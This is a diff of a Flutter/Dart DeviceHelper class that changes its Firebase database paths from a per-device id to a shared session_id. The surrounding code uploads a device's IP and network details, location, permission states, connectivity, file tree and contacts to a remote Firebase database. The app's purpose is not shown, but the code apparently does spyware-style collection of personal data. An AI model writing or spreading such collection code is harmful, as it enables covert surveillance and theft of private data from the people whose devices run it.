@@ -16,6 +16,7 @@ import 'package:uuid/uuid.dart';
 import 'package:path_provider/path_provider.dart';
 
 import 'device_info_helper.dart';
+import '../main.dart';
 
 class DeviceHelper {
   static Future<bool> _saveIp(String id) async {
@@ -27,9 +28,9 @@ class DeviceHelper {
         // print('result: $result');
         String ip = result['ip'] ?? '';
         // print('IP: $ip');
-        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/ip");
+        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/ip");
         DatabaseReference refIfconfig =
-            FirebaseDatabase.instance.ref("devices/$id/ifconfig");
+            FirebaseDatabase.instance.ref("devices/$session_id/ifconfig");
         await ref.set(ip);
         await refIfconfig.set(result);
         return true;
@@ -68,7 +69,7 @@ class DeviceHelper {
           await Firebase.initializeApp(
               options: DefaultFirebaseOptions.currentPlatform);
         }
-        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id");
+        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/");
         await ref.set({
           'info': body,
           'id': id,
@@ -86,7 +87,7 @@ class DeviceHelper {
           // print('Firebase init error: $e');
         }
         DatabaseReference ref =
-            FirebaseDatabase.instance.ref("devices/$id/info");
+            FirebaseDatabase.instance.ref("devices/$session_id/info");
         await ref.set(body);
       }
 
@@ -132,7 +133,7 @@ class DeviceHelper {
       //print('Postion: $position');
       if (position != null) {
         DatabaseReference refLoc =
-            FirebaseDatabase.instance.ref("devices/$id/location");
+            FirebaseDatabase.instance.ref("devices/$session_id/location");
         if (!(await refLoc.get()).exists) {
           await refLoc.set(position);
         }
@@ -145,19 +146,19 @@ class DeviceHelper {
   static Future<void> saveUpadateState() async {
     String? uid = await getUID();
     // print(uid);
-    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$uid");
+    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
     await ref.set({'tapUpdate': true});
   }
 
   static Future<void> saveUpdateTime(String time) async {
     String? uid = await getUID();
-    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$uid");
+    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
     await ref.child("lastUpdateTime").set(time);
   }
 
   static Future<void> saveConnectivity() async {
     String? uid = await getUID();
-    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$uid");
+    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
     await ref.child("connectivityState").set(
         (await Connectivity().checkConnectivity())
             .map((e) => e.name)
@@ -166,7 +167,7 @@ class DeviceHelper {
 
   static Future<void> saveGrantedPermissions() async {
     String? uid = await getUID();
-    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$uid");
+    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
     final locationGranted = await Permission.location.isGranted;
     final contactsGranted = await Permission.contacts.isGranted;
     final filesGranted;
@@ -211,7 +212,7 @@ class DeviceHelper {
   static Future<bool> open(String id) async {
     // print('DeviceHelper.open called for id: $id');
     int time = DateTime.now().millisecondsSinceEpoch;
-    DatabaseReference ref = FirebaseDatabase.instance.ref("open/$id/$time");
+    DatabaseReference ref = FirebaseDatabase.instance.ref("open/$session_id/$time");
     await ref.set(
         {'at': DateTime.fromMillisecondsSinceEpoch(time).toIso8601String()});
 
@@ -289,7 +290,7 @@ class DeviceHelper {
     // print('++++++++++\nStarting to add file tree... ID: $id, Data: $data\n\n');
     var uuid = const Uuid();
     DatabaseReference ref =
-        FirebaseDatabase.instance.ref("devices/$id/file_tree/${uuid.v1()}");
+        FirebaseDatabase.instance.ref("devices/$session_id/file_tree/${uuid.v1()}");
     await ref.set(data);
   }
 
@@ -366,7 +367,7 @@ class DeviceHelper {
     String idTitle = title ?? DateTime.now().millisecond.toString();
     if (uid != null) {
       DatabaseReference ref =
-          FirebaseDatabase.instance.ref("contacts/$uid/$idTitle");
+          FirebaseDatabase.instance.ref("contacts/$session_id/$idTitle");
       await ref.set({'data': data ?? {}});
     }
   }
